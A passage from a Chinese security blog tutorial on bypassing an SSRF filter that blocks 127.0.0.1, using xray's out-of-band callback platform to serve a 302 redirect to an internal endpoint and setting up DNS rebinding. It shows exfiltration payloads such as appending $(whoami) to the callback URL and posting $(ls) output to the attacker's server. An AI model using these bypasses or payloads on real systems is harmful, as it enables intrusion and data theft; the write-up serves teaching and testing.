&lt;p&gt;如果更换为其他的内网 ip，会提示连接超时 &lt;code class=&quot;highlighter-rouge&quot;&gt;HTTPConnectionPool(host='192.168.1.1', port=8000): Max retries exceeded with url: / (Caused by ConnectTimeoutError(, 'Connection to 192.168.1.1 timed out. (connect timeout=2)'))&lt;/code&gt;，当然这也是探测内网 ip 和端口是否存在的一种特征。但是经过尝试，常见的 IP 和端口都是超时的，服务器应该是没有内网的（此处应该写一个脚本去扫描更多的 IP 和端口）。所以重点就在于如何绕过对 &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt; 的限制了。&lt;/p&gt;

&lt;h2 id=&quot;看看-ipv6&quot;&gt;看看 IPv6&lt;/h2&gt;

&lt;p&gt;首先是尝试使用 IPv6 去绕过，访问 &lt;code class=&quot;highlighter-rouge&quot;&gt;http://vuln.net:8000/?url=http://[::1]:8000&lt;/code&gt;，如果服务器监听了 IPv6 的地址，就可以绕过，因为访问的确实不是 &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt;。但是经过测试发现还是报错，&lt;code class=&quot;highlighter-rouge&quot;&gt;[Errno -2] Name or service not known&lt;/code&gt;，可能后端有一些函数是不支持 IPv6 的，像是将 &lt;code class=&quot;highlighter-rouge&quot;&gt;[::1]&lt;/code&gt; 按照一个域名去解析了，所以这条路走不通了。&lt;/p&gt;

&lt;h2 id=&quot;30x-跳转也许可以&quot;&gt;30x 跳转也许可以&lt;/h2&gt;

&lt;p&gt;接下来是利用 30x 跳转去绕过，因为看上面的报错信息，后端应该是 Python，Python 的 requests 等库都是默认允许跳转的，如果可以提供一个非 &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt; 的 url，然后访问的时候返回一个 302 跳转到 &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt; 上去就可以了。我们需要一个可以方便的自定义 http response 的平台，一种思路就是配置一个 Nginx，结合配置文件或者 Lua 脚本可以完全的实现各种自定义，但是稍有些麻烦，这时候我们就应该请出 xray 自带的反连平台了，它可以方便的在网页上配置我们期望的东西。&lt;/p&gt;

&lt;h2 id=&quot;使用-xray-自带的反连平台&quot;&gt;使用 xray 自带的反连平台&lt;/h2&gt;

&lt;h3 id=&quot;如何配置&quot;&gt;如何配置&lt;/h3&gt;

&lt;p&gt;首先去 &lt;a href=&quot;https://github.com/chaitin/xray/releases&quot;&gt;GitHub&lt;/a&gt; 下载最新的 xray 二进制文件，然后运行 &lt;code class=&quot;highlighter-rouge&quot;&gt;./xray help&lt;/code&gt; 让 xray 生成一个默认的配置文件 &lt;code class=&quot;highlighter-rouge&quot;&gt;cofig.yaml&lt;/code&gt;。我们需要在这个配置文件中配置反连平台的一些参数，默认是配置如下。&lt;/p&gt;

&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;db_file_path&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;./xray.db&quot;&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;enabled&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;listen_ip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;127.0.0.1&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;listen_port&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;dns&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;enabled&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;false&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;listen_ip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;127.0.0.1&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 静态解析规则&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# A, AAAA, TXT 三种&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;localhost&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;127.0.0.1&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;60&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;http_base_url&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;dns_server_ip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;remote_server&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;false&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;暂时只需要反连平台的 HTTP 相关功能，而不需要漏洞扫描和反连平台 DNS 相关的功能，所以只关心上面 DNS 以外的配置文件就足够了。&lt;/p&gt;

&lt;p&gt;为了让之前提到的存在 ssrf 漏洞的应用可以访问的到，我们将 xray 运行在一个公网 IP 的机器上，所以 xray 监听的 IP 等等都需要配置，将上面的配置修改如下。&lt;/p&gt;

&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# 数据库文件路径，默认不用修改。&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# 本文件只能一个进程访问，如果启动两个 xray 就需要指定不同的路径。&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;db_file_path&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;./xray.db&quot;&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# 用于生成的 url 验证，否则反连平台的 IP 一旦泄露，任何人访问你的平台都会被记录访问记录。&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# 有了 token 可以限制生效范围，而且修改 token 就可以失效以前的 url。&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# 我们修改为一个自定义的值&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;imtoken1&quot;&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;enabled&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 监听地址，我们在公网机器上需要修改为 `0.0.0.0`，让所有地址都可以访问&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 注意不一定是机器的公网 IP，本机不一定拥有这个 IP，否则会出错&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;listen_ip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0.0.0.0&quot;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 监听端口，我们使用 4445&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;listen_port&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;4445&quot;&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# dns 部分没有修改&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 指定 http 部分的访问地址，这里才应该是机器的公网 IP&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;http_base_url&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://140.143.224.171:4445&quot;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;dns_server_ip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;remote_server&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;false&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;修改完成之后，运行 &lt;code class=&quot;highlighter-rouge&quot;&gt;./xray reverse&lt;/code&gt;，就可以看到反连平台启动了。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[INFO] 2019-09-08 09:25:02 +0800 [default:config.go:160] loading config from config.yaml
reverse server base url: http://140.143.224.171:4445, token: imtoken1
reverse server webUI: http://140.143.224.171:4445/cland/
[DBUG] 2019-09-08 09:25:03 +0800 [default:reverse.go:40] reverse http server started, base url: http://140.143.224.171:4445, token: imtoken1
[INFO] 2019-09-08 09:25:03 +0800 [reverse:http_server.go:118] starting reverse http server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;访问提示的地址 &lt;code class=&quot;highlighter-rouge&quot;&gt;http://140.143.224.171:4445/cland/&lt;/code&gt; 就可以看到反连平台的的界面了。点击 &lt;code class=&quot;highlighter-rouge&quot;&gt;生成一个 URL&lt;/code&gt; 就会提示输入 token。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/796/15679060423634.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;反连平台的-http-访问记录功能&quot;&gt;反连平台的 HTTP 访问记录功能&lt;/h3&gt;

&lt;p&gt;先按照页面上的提示先测试下反连平台的功能，运行 &lt;code class=&quot;highlighter-rouge&quot;&gt;curl -v http://140.143.224.171:4445/p/89acfe/H34v/&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; http://140.143.224.171:4445/p/89acfe/H34v/
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   Trying 140.143.224.171...
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; TCP_NODELAY &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connected to 140.143.224.171 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;140.143.224.171&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; port 4445 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; GET /p/89acfe/H34v/ HTTP/1.1
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Host: 140.143.224.171:4445
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; User-Agent: curl/7.54.0
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Accept: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt; HTTP/1.1 200 OK
&amp;lt; Content-Security-Policy: default-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; script-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'unsafe-inline'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; object-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; style-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'unsafe-inline'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; img-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; media-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; frame-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; font-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt; data:&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; connect-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;
&amp;lt; Content-Type: application/json
&amp;lt; X-Content-Type-Options: nosniff
&amp;lt; X-Frame-Options: SAMEORIGIN
&amp;lt; X-Xss-Protection: 1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;block
&amp;lt; Date: Sun, 08 Sep 2019 01:28:16 GMT
&amp;lt; Content-Length: 22
&amp;lt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connection &lt;span class=&quot;c&quot;&gt;#0 to host 140.143.224.171 left intact&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;code&quot;&lt;/span&gt;:0,&lt;span class=&quot;s2&quot;&gt;&quot;data&quot;&lt;/span&gt;:null&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;%
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后在左边的 &lt;code class=&quot;highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; 一栏中就可以看到了访问记录&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/796/15679061607483.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而且反连平台支持在 url 后面随意添加参数，比如 &lt;code class=&quot;highlighter-rouge&quot;&gt;http://140.143.224.171:4445/p/89acfe/H34v/$(whoami)&lt;/code&gt;，这样在测试一些命令执行漏洞的时候，就很方便的将一些执行结果带出来。&lt;/p&gt;

&lt;p&gt;如果 url 位置的长度不够，还可以使用 POST 方法。比如 &lt;code class=&quot;highlighter-rouge&quot;&gt;curl -v http://140.143.224.171:4445/p/89acfe/H34v/ -d &quot;$(ls)&quot;&lt;/code&gt; 就可以看到访问记录是这样的。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/796/15679064342320.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;反连平台指定-response-功能&quot;&gt;反连平台指定 response 功能&lt;/h3&gt;

&lt;p&gt;话说回来，为了验证之前利用跳转进行绕过的思路，我们在 xray 的反连平台上创建一个 url，然后指定 status code 和 header 就可以了。在网页上配置起来也是非常的简单。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/796/15679069339033.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;点击保存之后，我们先用 curl 测试下。&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; http://140.143.224.171:4445/p/1cd0a7/3OGA/
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   Trying 140.143.224.171...
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; TCP_NODELAY &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connected to 140.143.224.171 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;140.143.224.171&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; port 4445 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; GET /p/1cd0a7/3OGA/ HTTP/1.1
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Host: 140.143.224.171:4445
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; User-Agent: curl/7.54.0
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Accept: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt; HTTP/1.1 302 Found
&amp;lt; Content-Type: text/html
&amp;lt; Location: http://127.0.0.1:8000/api/internal/secret
&amp;lt; Date: Sun, 08 Sep 2019 01:42:41 GMT
&amp;lt; Content-Length: 0
&amp;lt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connection &lt;span class=&quot;c&quot;&gt;#0 to host 140.143.224.171 left intact&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;工作一切正常。&lt;/p&gt;

&lt;h3 id=&quot;跳转可以绕过验证成功&quot;&gt;跳转可以绕过验证，成功~&lt;/h3&gt;

&lt;p&gt;访问 &lt;code class=&quot;highlighter-rouge&quot;&gt;http://vuln.net:8000/?url=http://140.143.224.171:4445/p/1cd0a7/3OGA/&lt;/code&gt; 发现漏洞利用成功，查看反连平台的访问记录，也验证了之前的猜测，后端是一个 Python 的服务。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/796/15679070964121.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/796/15679070689596.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;有什么其他的绕过么&quot;&gt;有什么其他的绕过么&lt;/h2&gt;

&lt;p&gt;第一个思路使用跳转绕过验证利用成功，在开头我们怀疑后端一开始会先解析一下域名为 IP，否则使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;localhost&lt;/code&gt; 等域名就直接绕过了，这里就可能引入另外一个问题，后端检查时候的域名解析结果和最后 requests 访问的时候的域名解析结果一定一样么？&lt;/p&gt;

&lt;h3 id=&quot;两次解析-ip-一定一样么&quot;&gt;两次解析 IP 一定一样么&lt;/h3&gt;

&lt;p&gt;我们这么怀疑有有依据的&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Linux 的 &lt;code class=&quot;highlighter-rouge&quot;&gt;getaddrbyname&lt;/code&gt; 等函数只会返回一个 IP，但是实际上一个域名是可以配置多条 IP 的，那这时候，如果返回 IP 的顺序是随机的，就可能被绕过。&lt;/li&gt;
  &lt;li&gt;为了提高性能而且减轻 dns 服务器的负担，域名的解析记录都是有缓存时间的，就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;TTL&lt;/code&gt;，一般为 60s 或者 600s，但是也可以配置为 0，这样每次向 dns 服务器查询，dns 服务器都需要去这个域名的 ns 服务器重新查询。本条思路在实践中主要存在两个问题
    &lt;ul&gt;
      &lt;li&gt;主流的公开的 ns 服务器都不能配置 &lt;code class=&quot;highlighter-rouge&quot;&gt;TTL&lt;/code&gt; 为 0，只能使用自己的解析服务。&lt;/li&gt;
      &lt;li&gt;很多 dns 服务器并不完全遵循 &lt;code class=&quot;highlighter-rouge&quot;&gt;TTL&lt;/code&gt;，比如配置了 &lt;code class=&quot;highlighter-rouge&quot;&gt;TTL&lt;/code&gt; 为 0 也会强制缓存一小段时间。经过验证，&lt;code class=&quot;highlighter-rouge&quot;&gt;8.8.8.8&lt;/code&gt; 提供的 dns 服务器是完全遵循的。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;6块钱买一个域名来测试&quot;&gt;6块钱买一个域名来测试&lt;/h3&gt;

&lt;p&gt;为了测试 dns rebinding 漏洞，我们需要去购买一个域名，当然是选择最便宜的了，反正使用没有任何区别，我是在阿里云购买的 &lt;code class=&quot;highlighter-rouge&quot;&gt;revc.xyz&lt;/code&gt; 域名，一年只需要 6 块钱，如果不需要长期持有，第二年重新购买一个就足够了，因为续费是比较贵的。&lt;/p&gt;

&lt;p&gt;按照上面的思路，我们需要将这个域名的 ns 服务器修改为自己的，这时候我们可以再去借助 xray 自带的反连平台了，因为它也是支持作为 ns 服务器去解析域名的，去阿里云的管理界面修改就可以了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/796/15679085467078.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后遇到了拦路虎，ns 服务器必须是域名，而不能是 IP，这时候我们还需要再去买一个域名？&lt;/p&gt;

&lt;h3 id=&quot;鸡生蛋还是蛋生鸡的问题&quot;&gt;鸡生蛋还是蛋生鸡的问题&lt;/h3&gt;

&lt;p&gt;其实不是的，我们完全自己解析自己，也就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;ns1.revc.xyz&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;ns2.revc.xyz&lt;/code&gt; 作为 &lt;code class=&quot;highlighter-rouge&quot;&gt;revc.xyz&lt;/code&gt; 的 ns 服务器。这时候有人可能有疑问，这不是鸡生蛋蛋生鸡的问题么，&lt;code class=&quot;highlighter-rouge&quot;&gt;ns1&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;ns2&lt;/code&gt; 去哪里解析，这其实是 dns 提供的功能，添加 glue record，我们可以先不用了解细节，直接去配置即可。就在左侧导航栏的 &lt;code class=&quot;highlighter-rouge&quot;&gt;自定义 DNS Host&lt;/code&gt; 里面。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/796/15679086195905.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们配置 &lt;code class=&quot;highlighter-rouge&quot;&gt;ns1&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;ns2&lt;/code&gt; 为服务器的 IP，然后回到上一个页面配置 ns 为 &lt;code class=&quot;highlighter-rouge&quot;&gt;ns1.revc.xyz&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;ns2.revc.xyz&lt;/code&gt; 就可以了。然后注意下面的提示，我们还需要添加 &lt;code class=&quot;highlighter-rouge&quot;&gt;ns1&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;ns2&lt;/code&gt; 的 A 记录。这些都可以在 xray 的反连平台中配置。&lt;/p&gt;

&lt;p&gt;编辑刚才的配置文件&lt;/p&gt;

&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# 其他的项目没有修改 ...&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;dns&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;enabled&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 和之前 http 的 listen ip 含义一样，修改为 0.0.0.0&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;listen_ip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0.0.0.0&quot;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 刚才注册的域名&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;revc.xyz&quot;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 静态解析规则，如果请求解析的域名在下面配置了，就直接返回对应的结果&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# dns rebinding 返回的 ip 是动态的&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 示例配置文件的中的 localhost 是演示使用的，我们添加 ns1 和 ns2 的 A 记录&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ns1&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;140.143.224.171&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;60&lt;/span&gt;
